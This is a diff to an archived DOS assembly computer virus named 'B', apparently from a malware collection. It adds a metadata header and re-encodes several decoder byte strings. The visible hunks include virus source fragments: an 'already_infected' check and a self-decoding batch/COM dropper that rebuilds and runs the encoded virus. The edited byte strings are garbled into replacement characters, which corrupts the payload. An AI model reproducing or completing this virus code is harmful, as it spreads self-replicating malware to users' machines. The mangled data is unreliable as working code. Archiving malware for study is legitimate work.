@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      B
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 		.model  tiny
 		.code
 		.radix  16
@@ -144,10 +155,10 @@ already_infected:
 ; The decoder creates a file which, when run, will execute the encoded file.
 ; In this case, we are encoding the virus. See the beginning for a complete
 ; explanation of how the virus works.
-decoder         db      '@echo øPSBAT!ø¿PS½'
+decoder         db      '@echo ï¿½PSBAT!ï¿½ï¿½PSï¿½'
 fsize           dw      -1 * (heap - blah)
-		db      'XYZ÷ÝU¾S¹  2é¬H‹Ø¬,AÃªMtâñít­ëå>',0ba,'.com',0Dh,0A
-		db      '@echo ¸üü2àYP—¸ó¤«¸ëë2à«¾PS¿DBïDAÃ'
+		db      'XYZï¿½ï¿½Uï¿½Sï¿½  2ï¿½Hï¿½Ø¬,AÃªMtï¿½ï¿½ï¿½tï¿½ï¿½ï¿½>',0ba,'.com',0Dh,0A
+		db      '@echo ï¿½ï¿½ï¿½2ï¿½YPï¿½ï¿½ó¤«¸ï¿½ï¿½2à«¾PSï¿½DBï¿½ï¿½DAï¿½'
 endline:        db      '>>',0ba,'.com',0Dh,0A
 ; The next line is to ease the coding. This way, the same number of statements
 ; pass between the running of the temporary program and the reloading of the
@@ -623,7 +634,7 @@ end_all:
 		.radix  16
 		org     100
 
-decode:         db      'øPSBAT!ø'      ; translates to some random code
+decode:         db      'ï¿½PSBAT!ï¿½'      ; translates to some random code
 
 		mov     di,offset buffer
 		db      0bdh    ; mov bp, datasize
